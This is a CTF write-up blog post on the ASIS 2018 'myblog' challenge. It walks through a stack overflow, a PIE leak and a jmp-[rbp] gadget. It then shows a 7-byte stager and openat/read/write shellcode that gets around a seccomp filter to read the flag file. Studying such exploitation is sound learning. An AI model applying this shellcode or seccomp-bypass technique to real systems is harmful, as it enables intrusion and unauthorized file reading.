---
title: ASIS CTF 2018 - My blog
author: Tosh
date: 2018-04-30
tags: ctf,asis,exploit,pown
layout: post
---

![](/images/asis-myblog.png)

- Exploit : [github](https://github.com/t00sh/ctf/tree/master/2018/asis/myblog)

- Challenge : [myblog](https://repo.t0x0sh.org/ctf/2018/asis/myblog/myblog)

For this challenge from ASIS-CTF, we have a remote ELF64 binary to exploit with almost all protections except SSP. This challenge have a menu asking different things like writing blog post, deleting them or showing the blog owner :

![](/images/asis-myblog2.png)

But the interesting function is hidden, and if we disassemble the binary with IDA-pro, we see that a special function can be called with "31337" from the menu. This function will call the read function with a size of 0x18, but only 0x10 bytes are allocated for the frame : we can trigger a stack-based overflow of 16 bytes.

![](/images/asis-myblog3.png)

One more interesting thing for this function : at the begining a function pointer is leaked, which break the PIE. But before returning, the function do different checks and do not allow us to have address between _base_ and  _base + 0xFFF_.

Now what can we do ?

If we go deeper, we can see an other interesting function called during the initialisation process. This function call mmap() with all protections (RWX), and allocate two memory pages. As you can see on the disassembly, the returned pointer is stored into .bss.

![](/images/asis-myblog4.png)

But can we control anything in this RWX memory zone ? The answer is yes. The third option in the menu allow us to write 7 bytes into this memory zone as you can see in this screen :

![](/images/asis-myblog5.png)

Now, we need two things : a 7 bytes shellcode and a gadget for calling the mmaped pointer. The second is easy to find with [rop-tool](https://github.com/t00sh/rop-tool) :

```
$ rop-tool g ./myblog
...
0x0000000000001893 -> jmp qword ptr [rbp];
...
```

By luck, we fully control the rbp pointer at the end of the vulnerable function (the saved-rbp is overwriten). Because of the very short shellcode size, I choosed to use the sys_read syscall for receiving a longer one at the same place. Here is my 7 bytes shellcode with the register settings at the end of the vulnerable function :

```
	section .text
    global _start
_start:
    ; EBX = 0
	; RBP = base + mmap_ptr
	; RDI = 0
	; RDX = 0x7f....
    xchg eax, ebx
    mov rsi, [rbp]
    syscall
```

This shellcode will receive data from stdin into the mmaped memory, and we can now send a more sophisticated one.

But we have a problem : at the beginning, seccomp is used and some syscalls are blacklisted. We can use [seccomp-tools](https://github.com/david942j/seccomp-tools) to see what syscalls cannot be called. And we get :

```
$ seccomp-tools dump ./myblog
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010
 0004: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0010
 0005: 0x15 0x04 0x00 0x0000003b  if (A == execve) goto 0010
 0006: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0010
 0007: 0x15 0x02 0x00 0x0000003a  if (A == vfork) goto 0010
 0008: 0x15 0x01 0x00 0x00000038  if (A == clone) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
 ```

We see that open, execve, fork, vfork and clone are forbidden. So, how can we read the flag ? To perform that, we can use the the syscall sys_openat with an absolute path : the first parameter (directory fd) will be ignored and the file will be opened. By luck, we learned the absolute path to the flag (/home/pwn/flag) from an another challenge.

We now have everything to build our second shellcode :

```
	section .text
	global _start
_start:
	;; openat()
	mov rbx, qword[rbp]
	add rbx, 0x1000
	mov qword[rbx], '/hom'
	mov qword[rbx+4], 'e/pw'
	mov qword[rbx+8], 'n/fl'
	mov qword[rbx+12], 'ag'
	mov qword[rbx+14], 0
	mov rax, 257
	mov rdi, 0
	mov rsi, rbx
	mov rdx, 0
	mov r10, 0
	syscall

	mov r10, rax

	;; read()
	mov rax, 0
	mov rdi, r10
	mov rsi, rbx
	mov rdx, 0x40
	syscall

	;; write()
	mov rax, 1
	mov rdi, 1
	mov rsi, rbx
	mov rdx, 0x40
	syscall
```

When the shellcode is executed, the flag is sent on stdout !
